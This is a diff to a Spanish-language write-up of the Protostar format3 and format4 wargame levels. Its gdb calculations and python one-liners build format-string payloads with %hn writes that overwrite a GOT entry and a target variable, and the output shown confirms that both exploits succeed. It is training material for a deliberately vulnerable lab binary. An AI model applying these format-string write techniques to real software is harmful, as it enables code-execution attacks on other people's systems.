@@ -392,17 +392,43 @@ $15 = 33963 -> Esto es lo que le pondremos al primer argumento
 (gdb) x/x 0x8049724
 0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x84b484b4 -> Ahora este es el GOT, pero no es el bueno, todavia nos queda un poco
 (gdb) print 0x0804 - 0x84b4 -> Lo que nos debe salir (primera mitad - lo que nos sale)
-$17 = -31920 -> Sale negativo, asi que le añadimos un bit a la izquierda
+$17 = -31920 -> Sale negativo, asi que le añadimos un uno a la izquierda
 (gdb) print 0x10804 - 0x84b4
 $19 = 33616 -> Esto es para el segundo argumento (el primero se queda como antes)
 [user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\x24\x97\x04\x08\x26\x97\x04\x08\%33963x%4$hn%33616x%5$hn")' | ./format4
 code execution redirected! you win
 ```
 
-Probe a hacer la tecnica de los 2 bytes con el format 3 pero me pasaba de largo (salia 55445544 y debia ser 1025544)
-Asi que en vez de restar la segunda mitad habia que restar la primera 
+Probe a hacer la tecnica de los 2 bytes con el format 3 (tiene que salir 0x1025544)
+
 ```console
-[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\x24\x97\x04\x08\x26\x97\x04\x08\%4$hn%5$hn")' > /tmp/pattern
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print "\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%12$hn%13$hn"' | ./format3 | tail -n1
+target is 00080008 :(
+(gdb) p 0x5544 - 0x008
+$1 = 21820
+(gdb) quit
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print "\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%21820x%13$hn%12$hn"' | ./format3 | tail -n1
+target is 55445544 :(
+```
+
+Nos hemos pasado de largo. Pero no ahy que asustarse, hay solución. Simplemente hay que modificar un poco la técncia.
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print "\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%12$hn%13$hn"' | ./format3 | tail -n1
+target is 00080008 :(
+(gdb) p 0x0102 - 0x0008 -> En vez de restar la segunda mitad (5544) ahora restamos la primera y se lo añadimos al primer argumento
+$1 = 250
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print "\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%250x%12$hn%13$hn"' | ./format3 | tail -n1
+target is 01020102 :(
+(gdb) p 0x5544 - 0x0102 -> Lo que nos queda, la segunda mitad.
+$3 = 21570 -> Como no da negativo no hay que añadir el uno a la izquierda como antes.
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print "\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%250x%12$hn%21570x%13$hn"' | ./format3 | tail -n1
+target is 55440102 :( 
+Sale al reves asi que hay que poner al reves el numero de argumentos (primero 13  luego 12) sin poner al reves los argumentos que se suman.
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print "\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%250x%13$hn%21570x%12$hn"' | ./format3 | tail -n1
+you have modified the target :)
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print "\xf6\x96\x04\x08\xf4\x96\x04\x08" + "%250x%12$hn%21570x%13$hn"' | ./format3 | tail -n1
+you have modified the target :) O cambiar las memorias, primero 6 luego 4
 ```
 
 
